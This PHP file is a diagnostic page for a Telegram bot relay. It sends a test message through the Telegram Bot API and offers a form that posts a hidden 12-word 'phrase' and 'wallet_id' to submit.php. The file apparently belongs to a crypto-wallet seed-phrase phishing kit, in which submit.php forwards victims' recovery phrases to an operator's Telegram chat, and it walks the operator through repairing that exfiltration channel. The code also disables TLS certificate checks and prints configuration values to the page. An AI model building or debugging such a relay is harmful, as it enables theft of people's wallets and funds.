<?php
/**
 * COMPREHENSIVE DIAGNOSTIC TEST
 * Visit this file in your browser to see what's wrong
 */

error_reporting(E_ALL);
ini_set('display_errors', 1);

require_once 'config.php';

?>
<!DOCTYPE html>
<html>
<head>
    <title>Telegram Diagnostic Test</title>
    <style>
        body { font-family: monospace; padding: 20px; background: #000; color: #0f0; }
        .error { color: #f00; }
        .success { color: #0f0; }
        .info { color: #ff0; }
        pre { background: #222; padding: 10px; border: 1px solid #444; }
    </style>
</head>
<body>
    <h1>TELEGRAM DIAGNOSTIC TEST</h1>
    
    <?php
    echo "<h2>1. Configuration Check</h2>";
    echo "Bot Token: " . substr(TELEGRAM_BOT_TOKEN, 0, 15) . "...<br>";
    echo "Chat ID: " . TELEGRAM_CHAT_ID . "<br>";
    echo "API URL: " . TELEGRAM_API_URL . "<br><br>";
    
    echo "<h2>2. PHP cURL Check</h2>";
    if (function_exists('curl_init')) {
        echo "<span class='success'>✅ cURL is enabled</span><br>";
    } else {
        echo "<span class='error'>❌ cURL is NOT enabled - Contact your hosting provider!</span><br>";
        exit;
    }
    
    echo "<h2>3. Direct Telegram API Test</h2>";
    
    $testMessage = "🧪 TEST MESSAGE\nTime: " . date('Y-m-d H:i:s');
    
    $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
    $postData = [
        'chat_id' => TELEGRAM_CHAT_ID,
        'text' => $testMessage
    ];
    
    echo "Sending to: " . $url . "<br>";
    echo "Chat ID: " . TELEGRAM_CHAT_ID . "<br><br>";
    
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $curlError = curl_error($ch);
    $curlErrno = curl_errno($ch);
    curl_close($ch);
    
    echo "HTTP Code: " . $httpCode . "<br>";
    if ($curlError) {
        echo "<span class='error'>cURL Error: " . $curlError . " (Code: " . $curlErrno . ")</span><br>";
    }
    echo "<br>";
    
    echo "<h3>Response:</h3>";
    echo "<pre>" . htmlspecialchars($response) . "</pre>";
    
    $result = json_decode($response, true);
    
    if ($httpCode == 200 && isset($result['ok']) && $result['ok'] === true) {
        echo "<h2 class='success'>✅ SUCCESS! Message sent to Telegram!</h2>";
        echo "<p class='success'>Check your Telegram now - you should see the test message.</p>";
    } else {
        echo "<h2 class='error'>❌ FAILED!</h2>";
        
        if (isset($result['description'])) {
            echo "<p class='error'><strong>Error:</strong> " . $result['description'] . "</p>";
            
            if (strpos($result['description'], 'chat not found') !== false) {
                echo "<p class='info'><strong>SOLUTION:</strong> Your Chat ID might be wrong. Make sure you:</p>";
                echo "<ul>";
                echo "<li>Message @userinfobot on Telegram</li>";
                echo "<li>Copy the Chat ID it gives you</li>";
                echo "<li>Make sure you've started a conversation with your bot first</li>";
                echo "</ul>";
            } elseif (strpos($result['description'], 'Unauthorized') !== false) {
                echo "<p class='info'><strong>SOLUTION:</strong> Your Bot Token is wrong. Get a new one from @BotFather</p>";
            }
        }
        
        if ($curlError) {
            echo "<p class='error'><strong>Connection Error:</strong> Your server cannot connect to Telegram API.</p>";
            echo "<p class='info'>Possible causes:</p>";
            echo "<ul>";
            echo "<li>Firewall blocking outbound HTTPS connections</li>";
            echo "<li>Server doesn't allow cURL to external URLs</li>";
            echo "<li>Network connectivity issues</li>";
            echo "</ul>";
        }
    }
    
    echo "<hr>";
    echo "<h2>4. Test submit.php Directly</h2>";
    echo "<form method='POST' action='submit.php' style='background: #222; padding: 20px; margin: 20px 0;'>";
    echo "<input type='hidden' name='phrase' value='test word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12'>";
    echo "<input type='hidden' name='wallet_id' value='Diagnostic Test'>";
    echo "<button type='submit' style='padding: 10px 20px; background: #0f0; color: #000; border: none; cursor: pointer;'>Test submit.php</button>";
    echo "</form>";
    ?>
    
    <hr>
    <h2>5. Manual Verification Steps</h2>
    <ol>
        <li>Go to Telegram and message @BotFather</li>
        <li>Send /mybots and select your bot</li>
        <li>Make sure your bot is active</li>
        <li>Start a conversation with your bot (send /start)</li>
        <li>Message @userinfobot to get your Chat ID</li>
        <li>Make sure the Chat ID matches: <?php echo TELEGRAM_CHAT_ID; ?></li>
    </ol>
</body>
</html>

